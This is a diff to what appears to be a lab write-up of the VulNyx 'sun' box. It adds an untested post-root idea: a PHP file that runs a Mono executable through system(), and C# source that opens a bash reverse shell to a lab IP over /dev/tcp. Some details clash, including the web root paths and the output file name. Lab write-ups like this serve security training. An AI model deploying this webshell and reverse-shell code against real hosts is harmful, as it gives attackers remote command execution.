@@ -212,3 +212,40 @@ Firmware Version: 6.00
 root@sun:~# 
 ```
 Another amazing box from d4t4s3c!
+
+A cool possible beyond root would be to try the [Mono exploit](https://www.gabriel.urdhr.fr/2023/02/28/rce-file-association-debian-mono/) since we know the document root is /var/www/aspnet, we can try to create an exec.php file that would force mono to run an compiled C# ms-dos executable file
+```php
+┌──(rami㉿zen)-[~/labs/vulnyx/sun]
+└─$ cat exec.php 
+<?php
+// Navigate to the directory where payload is uploaded
+chdir('/usr/share/nginx/html/');
+
+// Execute the payload using Mono CLR interpreter
+$output = system('mono shell.exe');
+echo $output;
+?>
+```
+and compile a c# script with the content 
+```cs
+using System;
+using System.Diagnostics;
+
+namespace BackConnect {
+  class ReverseBash {
+	public static void Main(string[] args) {
+	  Process proc = new System.Diagnostics.Process();
+	  proc.StartInfo.FileName = "bash";
+	  proc.StartInfo.Arguments = "-c \"bash -i >& /dev/tcp/192.168.174.129/1338 0>&1\"";
+	  proc.StartInfo.UseShellExecute = false;
+	  proc.StartInfo.RedirectStandardOutput = true;
+	  proc.Start();
+
+	  while (!proc.StandardOutput.EndOfStream) {
+		Console.WriteLine(proc.StandardOutput.ReadLine());
+	  }
+	}
+  }
+}
+```
+compile with `mcs shell.cs` to get a mono.exe file, upload and run, too burnt out to try this now, but I will later. 
